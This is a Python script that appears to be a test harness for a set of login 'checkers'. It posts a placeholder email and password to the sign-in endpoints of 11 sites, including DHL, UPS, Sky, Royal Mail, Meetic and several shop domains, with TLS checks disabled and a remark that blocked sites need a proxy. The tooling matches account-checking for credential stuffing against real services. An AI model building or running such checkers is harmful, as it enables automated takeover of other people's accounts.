#!/usr/bin/env python3
"""Quick test - Shows actual responses from all 11 sites"""
import requests
import warnings
from colorama import init, Fore

warnings.filterwarnings("ignore")
init(autoreset=True)

# Test credentials
email = "testuser@gmail.com"
password = "TestPass123"

ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36"

sites = [
    ("1. Azyrah", "https://shop.azyrah.to/auth/signin", "json", {"username": email, "password": password}),
    ("2. Blstash", "https://blstash.ws/login", "json", {"username": email, "password": password}),
    ("3. DHL", "https://www.dhl.com/en/express/tracking.html", "form", {"email": email, "password": password}),
    ("4. Easydeals", "https://easydeals.gs/login", "json", {"username": email, "password": password}),
    ("5. Everymail", "https://everymail.com/login", "form", {"email": email, "password": password}),
    ("6. Meetic", "https://www.meetic.fr/", "form", {"email": email, "password": password}),
    ("7. RoyalMail", "https://www.royalmail.com/", "json", {"email": email, "password": password}),
    ("8. Savastan0", "https://savastan0.tools/login", "json", {"username": email, "password": password}),
    ("9. Sky", "https://www.sky.com/signin", "json", {"username": email, "password": password}),
    ("10. Unitedshop", "https://unitedshop.su/login", "form", {"username": email, "password": password}),
    ("11. UPS", "https://www.ups.com/", "form", {"username": email, "password": password}),
]

print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'TESTING ALL 11 CHECKERS - ACTUAL RESPONSES'.center(70)}")
print(f"{Fore.CYAN}{'='*70}\n")

for name, url, ptype, payload in sites:
    print(f"{Fore.YELLOW}{name} - {url}")
    try:
        headers = {"User-Agent": ua, "Accept": "*/*"}
        if ptype == "json":
            headers["Content-Type"] = "application/json"
            r = requests.post(url, json=payload, headers=headers, timeout=8, verify=False)
        else:
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            r = requests.post(url, data=payload, headers=headers, timeout=8, verify=False, allow_redirects=False)
        
        status = r.status_code
        resp = r.text[:150].replace('\n', ' ').replace('\r', '') if r.text else "Empty"
        
        if status == 200:
            print(f"{Fore.GREEN}  Status: {status} | Response: {resp}...")
        elif status in [301, 302]:
            location = r.headers.get('Location', 'N/A')[:50]
            print(f"{Fore.YELLOW}  Status: {status} | Redirect to: {location}")
        elif status in [401, 403]:
            print(f"{Fore.RED}  Status: {status} | Auth required/Blocked")
        elif status == 404:
            print(f"{Fore.RED}  Status: {status} | Not found")
        else:
            print(f"{Fore.YELLOW}  Status: {status} | Response: {resp[:80]}...")
            
    except requests.exceptions.Timeout:
        print(f"{Fore.RED}  TIMEOUT (site slow or blocking direct access)")
    except requests.exceptions.ConnectionError as e:
        if "getaddrinfo" in str(e):
            print(f"{Fore.RED}  DNS ERROR (domain may not exist)")
        else:
            print(f"{Fore.RED}  CONNECTION ERROR")
    except Exception as e:
        print(f"{Fore.RED}  ERROR: {str(e)[:50]}")
    print()

print(f"{Fore.CYAN}{'='*70}")
print(f"{Fore.GREEN}{'TEST COMPLETE'.center(70)}")
print(f"{Fore.CYAN}{'='*70}")
print(f"\n{Fore.YELLOW}Note: Status 200/302 = Site responding")
print(f"{Fore.YELLOW}      Status 401/403 = Auth required (expected for login)")
print(f"{Fore.YELLOW}      Timeout/Error = Need proxy to access")
